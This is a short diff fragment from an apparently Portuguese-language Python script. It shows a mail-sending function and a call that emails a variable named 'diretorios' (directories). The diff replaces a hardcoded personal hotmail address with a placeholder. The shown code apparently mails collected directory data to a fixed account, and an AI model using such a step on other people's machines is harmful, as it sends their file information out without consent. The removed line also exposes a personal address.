@@ -30,4 +30,4 @@ def send_email(email,password,message):
     server.sendmail(email, email, message)
     server.quit()
 
-send_email('gugupitabersanete2607@hotmail.com', 'senha', diretorios)
+send_email('email', 'senha', diretorios)
